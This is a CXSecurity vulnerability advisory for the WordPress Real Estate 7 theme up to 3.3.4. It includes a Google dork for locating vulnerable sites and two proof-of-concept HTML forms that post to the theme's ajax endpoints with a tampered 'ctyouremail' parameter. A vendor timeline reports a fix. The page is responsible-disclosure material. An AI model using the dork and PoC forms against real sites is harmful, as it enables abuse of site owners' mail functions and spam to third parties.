---
title: WordPress Real Estate 7 Theme < = 3.3.4 - Abuse of Functionality
url: https://cxsecurity.com/issue/WLB-2023030023
source: CXSECURITY Database RSS Feed - CXSecurity.com
date: 2023-03-10
fetch_date: 2025-10-04T09:04:38.245541
---

# WordPress Real Estate 7 Theme < = 3.3.4 - Abuse of Functionality

[![Home Page](https://cert.cx/cxstatic/images/12018/cxseci.png)](https://cxsecurity.com/)

* [Home](https://cxsecurity.com/)
* Bugtraq
  + [Full List](https://cxsecurity.com/wlb/)
  + [Only Bugs](https://cxsecurity.com/bugs/)
  + [Only Tricks](https://cxsecurity.com/tricks/)
  + [Only Exploits](https://cxsecurity.com/exploit/)
  + [Only Dorks](https://cxsecurity.com/dorks/)
  + [Only CVE](https://cxsecurity.com/cvelist/)
  + [Only CWE](https://cxsecurity.com/cwelist/)
  + [Fake Notes](https://cxsecurity.com/bogus/)
  + [Ranking](https://cxsecurity.com/best/1/)
* CVEMAP
  + [Full List](https://cxsecurity.com/cvemap/)
  + [Show Vendors](https://cxsecurity.com/cvevendors/)
  + [Show Products](https://cxsecurity.com/cveproducts/)
  + [CWE Dictionary](https://cxsecurity.com/allcwe/)
  + [Check CVE Id](https://cxsecurity.com/cve/)
  + [Check CWE Id](https://cxsecurity.com/cwe/)
* Search
  + [Bugtraq](https://cxsecurity.com/search/)
  + [CVEMAP](https://cxsecurity.com/search/cve/)
  + [By author](https://cxsecurity.com/search/author/)
  + [CVE Id](https://cxsecurity.com/cve/)
  + [CWE Id](https://cxsecurity.com/cwe/)
  + [By vendors](https://cxsecurity.com/cvevendors/)
  + [By products](https://cxsecurity.com/cveproducts/)
* RSS
  + [Bugtraq](https://cxsecurity.com/wlb/rss/all/)
  + [CVEMAP](https://cxsecurity.com/cverss/fullmap/)
  + [CVE Products](https://cxsecurity.com/cveproducts/)
  + [Bugs](https://cxsecurity.com/wlb/rss/vulnerabilities/)
  + [Exploits](https://cxsecurity.com/wlb/rss/exploit/)
  + [Dorks](https://cxsecurity.com/wlb/rss/dorks/)
* More
  + [cIFrex](http://cifrex.org/)
  + [Facebook](https://www.facebook.com/cxsec)
  + [Twitter](https://twitter.com/cxsecurity)
  + [Donate](https://cxsecurity.com/donate/)
  + [About](https://cxsecurity.com/wlb/about/)

* [Submit](https://cxsecurity.com/wlb/add/)

|  |  |  |  |
| --- | --- | --- | --- |
|  |  | |  | | --- | | **WordPress Real Estate 7 Theme <= 3.3.4 - Abuse of Functionality** **2023.03.09**  **![ru](https://cert.cx/cxstatic/images/flags/ru.png) [FearZzZz](https://cxsecurity.com/author/FearZzZz/1/) **(RU)** ![ru](https://cert.cx/cxstatic/images/flags/ru.png)**  Risk: **Medium**  Local: **No**  Remote: ****Yes****  CVE: **N/A**  CWE: **[CWE-472](https://cxsecurity.com/cwe/CWE-472 "Click to see CWE-472")**  **[**Dork:** inurl:/wp-content/themes/realestate-7/](https://cxsecurity.com/dorks/)** | |

==== [ Z://USB-00\_RESEARCH/WORDPRESS/ ] ============================================= [ 2023 ] ==
Report Title: WordPress Real Estate 7 Theme <= 3.3.4 - Abuse of Functionality
Google Dork: inurl:/wp-content/themes/realestate-7/
Research Date: 2023-02-10
Researcher: FearZzZz [ https://fearzzzz.ru ]
Component Vendor: Contempo Themes [ https://contempothemes.com ]
Vulnerable Version: <= 3.3.4
Component Link: https://themeforest.net/item/wp-pro-real-estate-7-responsive-real-estate-wordpress-theme/12473778
CVSS Base Score: 7.2 (High)
CVSS Vector String: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:N/I:L/A:L
OWASP Top 10: A04: 2021 – Insecure Design
CWE: CWE-472
CVE: TBA
=================================================================================================
#### [ Description: ]
The Real Estate 7 theme for WordPress is vulnerable to Abuse of Functionality via the `ctyouremail` parameter in the `/includes/ajax-submit-favorites.php` and `/includes/ajax-submit-listings.php` files in versions up to, and including, v3.3.4. This makes it possible for unauthenticated attackers to use implemented functions from the vulnerable service to invoke unintended/malicious outcomes.
#### [ Impact: ]
If a web application doesn't properly protect assumed-immutable values from modification in hidden form fields, parameters, cookies, or URLs, this can lead to modification of critical data. Improper validation of data that are user-controllable can lead to the application processing incorrect, and often malicious, input.
#### [ Proof-of-Concept: ]
```
<html>
<body>
<script>history.pushState('', '', '/')</script>
<form action="https://fearzzzz.ru/wp-content/themes/realestate-7/includes/ajax-submit-favorites.php" method="POST">
<input type="hidden" name="ctsubject" value="Fear&#32;is&#32;Big&#32;Business" />
<input type="hidden" name="name" value="FearZzZz" />
<input type="hidden" name="email" value="fearzzzz&#64;tutanota&#46;com" />
<input type="hidden" name="ctphone" value="no" />
<input type="hidden" name="message" value="Fear&#32;is&#32;Big&#32;Business" />
<input type="hidden" name="ctyouremail" value="fearzzzz&#64;tutanota&#46;com" />
<input type="hidden" name="ctproperty" value="https&#58;&#47;&#47;fearzzzz&#46;ru" />
<input type="submit" value="Submit request" />
</form>
</body>
</html>
```
```
<html>
<body>
<script>history.pushState('', '', '/')</script>
<form action="https://fearzzzz.ru/wp-content/themes/realestate-7/includes/ajax-submit-listings.php" method="POST">
<input type="hidden" name="listing&#95;id" value="451" />
<input type="hidden" name="ctsubject" value="Fear&#32;is&#32;Big&#32;Business" />
<input type="hidden" name="name" value="FearZzZz" />
<input type="hidden" name="email" value="fearzzzz&#64;tutanota&#46;com" />
<input type="hidden" name="ctphone" value="" />
<input type="hidden" name="message" value="Fear&#32;is&#32;Big&#32;Business" />
<input type="hidden" name="ctyouremail" value="fearzzzz&#64;tutanota&#46;com" />
<input type="hidden" name="ctproperty" value="Z" />
<input type="hidden" name="ctlistingstreet" value="Z" />
<input type="hidden" name="ctlistingcity" value="Z" />
<input type="hidden" name="ctlistingstate" value="Z" />
<input type="hidden" name="ctlistingzip" value="Z" />
<input type="hidden" name="ctpermalink" value="https&#58;&#47;&#47;fearzzzz&#46;ru" />
<input type="hidden" name="ctlistingprice" value="Z" />
<input type="hidden" name="ctlistingsqft" value="Z" />
<input type="hidden" name="ctlistingbeds" value="" />
<input type="hidden" name="ctlistingbaths" value="" />
<input type="hidden" name="ctlistinglotsize" value="" />
<input type="hidden" name="ctlistingmlsnumber" value="" />
<input type="hidden" name="ctlistingpropertytype" value="Detached" />
<input type="submit" value="Submit request" />
</form>
</body>
</html>
```
#### [ Timeline: ]
2023.02.08 - Real Estate 7 Theme v3.3.4 released.
2023.02.10 - Vulnerability has been discovered.
2023.02.15 - Vendor notified.
2023.02.16 - Chris Robinson responded that the vulnerabilities have been fixed. The release of the new version v3.3.5 is scheduled for March 6.
#### [ Contacts: ]
Website: fearzzzz.ru
Email: fearzzzz@tutanota.com
Twitter: https://twitter.com/fear\_zzzz
Medium: https://fearzzzz.medium.com
GitHub: https://github.com/fearzzzz
YouTube: https://youtube.com/@fearzzzz
#### [ Notes: ]
Special thanks to Chris Robinson (Contempo Themes Founder & CEO) for the quick response and for the respectful communication.
#### [ Disclaimer: ]
The information provided in this report is provided "as is" without warranty of any kind. FearZzZz disclaims all warranties, either express or implied, including the warranties of merchantability and fitness for a particular purpose. In no event shall FearZzZz be liable for any damages whatsoever including direct, indirect, incidental, consequential, loss of business profits or special damages, even if FearZzZz have been advised of the possibility of such damages.
========================================================================== [ www.fearzzzz.ru ] ==

**##### References:**

https://raw.githubusercontent.com/fearzzzz/fearzzzz.github.io/main/vulnerability/%5B2023-02-10%5D-%5BWordPress%5D-Real-Estate-7-Premium-Theme-v3.3.4-Abuse-of-Functionality.txt

[**See this note in RAW Version**](https://cxsecurity.com/ascii/WLB-2023030023)

[Tweet](https://twitter.com/share)

Vote for this issue:
 3
 0

100%

0%

#### **Thanks for you vote!**

#### **Thanks for you comment!** Your message is in quarantine 48 hours.

Comment it here.

Nick (\*)

Email (\*)

Video

Text (\*)

(\*) - required fields.
Cancel
...